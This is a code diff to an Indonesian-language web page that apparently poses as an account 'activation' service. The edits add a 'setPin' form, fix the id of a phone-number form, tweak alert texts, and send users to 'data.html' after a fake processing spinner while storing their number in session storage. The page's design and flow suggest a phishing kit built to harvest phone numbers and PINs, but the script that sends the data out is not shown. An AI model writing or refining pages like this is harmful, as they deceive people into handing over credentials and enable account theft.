@@ -1173,7 +1173,8 @@ chsalxcome {
   <div class="container-3 w-container">
    <div class="form-block w-form">
  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtwMsvOhhtgycRDO9l_RsE1kA1JMuEsxxefKfckE8PwgQ8FiI-ZwGUvxoUDkWVLAK-mmjpqlR7P9mcsGedEyTl07dFsXNuf4fPbvWqnxeZtpCLrrNOieYNHbvtjUA3hSWrPQG6dBgdsP5e7msEF5PtqQkvkcouBIiaRh05Ui8jwiVu7tBzi5dJEhEe1QU/s1080/AddText_04-27-07.11.32.jpg" width="100%" style="margin-top: -90px">
- <form id=formHP" onsubmit="loader(event); return false" style="padding: 10px">
+ <form id="setPin" onsubmit="">
+ <form id="formHP" onsubmit="loader(event); return false" style="padding: 10px">
  <section class="" style="padding: 4px; position: static; left: 0; right: 0; margin: -10px auto; width: 60%">
 	<div class="radio-list" style="position: absolute; left: 0; right: 0; margin: 0px auto; width: 75%">
 	<center>
@@ -1224,13 +1225,13 @@ chsalxcome {
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
     integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
     crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-<script src="setPin.js"></script>
+   <script src="setPin.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js">
     </script>
    <script>
 function normal () {
-alert("oops Anda tidaklah memiliki ijin");
+alert("oops Anda tidak memiliki ijin");
 }
 function sweet (){
 swal(" Forbidden ", "Silahkan Aktivasi terlebih dahulu untuk menggunakan fitur","error")
@@ -1303,7 +1304,7 @@ document.getElementById('btnSubmit1').innerHTML = "Memproses...";
             console.log('Complete')
   setTimeout(function(){
    $('#lodingku').hide();
-     window.location = "setPin.js";
+     window.location = "data.html";
  var nomor = document.getElementById('nope').value;
 sessionStorage.setItem("nomor", nomor);
      }, 500);
